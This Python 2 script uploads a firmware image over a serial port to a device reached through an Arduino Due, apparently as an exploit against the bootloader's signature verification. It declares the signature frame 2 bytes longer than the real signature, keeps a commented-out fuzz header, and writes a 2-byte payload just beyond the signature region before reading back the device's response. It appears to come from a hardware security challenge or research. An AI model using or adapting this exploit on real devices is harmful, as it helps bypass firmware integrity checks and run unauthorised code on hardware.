import time
import serial
import struct

# Offsets
code_offset = 0x0042
data_offset = 0x1000
sign_offset = 0x0000
# Sizes
code_size   = 0x03C8
data_size   = 0x0344
sign_size   = 0x0040
# Codes from the prog.img binary
hcode="\x63\x6F\x64\x65" + "\x40\x00\x00\x00" + struct.pack('<i', code_offset) + struct.pack('<I', code_size)
hdata="\x64\x61\x74\x61" + "\x08\x04\x00\x00" + struct.pack('<I', data_offset) + struct.pack('<I', data_size)
hsign="\x73\x69\x67\x6E" + "\x4C\x07\x00\x00" + struct.pack('<I', sign_offset) + struct.pack('<I', sign_size + 0x2)
hfuzz="\x00\x00\x00\x00" + "\x00\x00\x00\x00" + struct.pack('<I', 0x3000) + struct.pack('<I', 0x0000)

def chksum( code ):
	eax = 0;
	for c in code:
		edx = ord(c)
		edx <<= 8
		eax ^= edx
		for x in range(0, 8):
			if eax & 0x8000:
				eax ^= 0x8380
			eax *= 2
	eax >>= 8
	return chr(eax)

def sendSerial( payload ):
	data = chr(len(payload)) + payload + chksum(payload)
	ser.write(data)
	# print payload

# ser = serial.Serial(port='COM4') # for Windows
ser = serial.Serial(port='/dev/serial/by-id/usb-Arduino_LLC_Arduino_Due-if00') # for Linux
# ser = serial.Serial(port='/dev/tty.usbmodem1a151') # for Mac

print "Hi: ",
sendSerial("\x00")
print ser.read(4) # Wait for ACK


# CODE HEADER
print "Code frame: " + hex(code_offset) + " - " + hex(code_offset+code_size)
sendSerial("\x03" + hcode)
print ser.read(4) # Wait for ACK
'''
#Fuzz header
print "Sending fuzz header: ",
sendSerial("\x03" + hfuzz)
print ser.read(4)
'''
# DATA HEADER
print "Data frame: " + hex(data_offset) + " - " + hex(data_offset+data_size)
sendSerial("\x03" + hdata)
print ser.read(4) # Wait for ACK

# SIGN HEADER
print "Sign frame: " + hex(sign_offset) + " - " + hex(sign_offset+sign_size)
sendSerial("\x03" + hsign)
print ser.read(4) # Wait for ACK

## Open file and send contents
f = open('prog.img', 'r')

# Code
print "Sending code..."
f.seek(0x40)
for i in xrange(code_offset, code_offset+code_size, 0x80):
	if(((code_offset+code_size)-i) >= 0x80):
		sendSerial("\x01" + struct.pack('<i', i) + f.read(0x80))
	else:
		sendSerial("\x01" + struct.pack('<i', i) + f.read((code_offset+code_size)-i))
	print hex(i) + " : ",
	print ser.read(4)

# Data
print "Sending data..."
for i in xrange(data_offset, data_offset+data_size, 0x80):
	if(((data_offset+data_size)-i) >= 0x80):
		sendSerial("\x01" + struct.pack('<I', i) + f.read(0x80))
	else:
		sendSerial("\x01" + struct.pack('<I', i) + f.read((data_offset+data_size)-i))
	print hex(i) + " : ",
	print ser.read(4)

# Sign
print "Sending sign..."
for i in xrange(sign_offset, sign_offset+sign_size, 0x80):
	if(((sign_offset+sign_size)-i) >= 0x80):
		sendSerial("\x01" + struct.pack('<I', i) + f.read(0x80))
	else:
		sendSerial("\x01" + struct.pack('<I', i) + f.read((sign_offset+sign_size)-i))
	print hex(i) + " : ",
	print ser.read(4)

# Payload
payloadoffset = sign_offset+0x40
payload = "\xE0\x07"
print "payload at ", hex(payloadoffset),
print " ", len(payload),
print " bytes : ",
sendSerial("\01" + struct.pack('<I', payloadoffset) + payload)
print ser.read(4)

# End
print "Bye: ",
sendSerial("\x02")
print ser.read(4) # Wait for ACK

# Response
print ser.read(0x248)
ser.close()




exit()
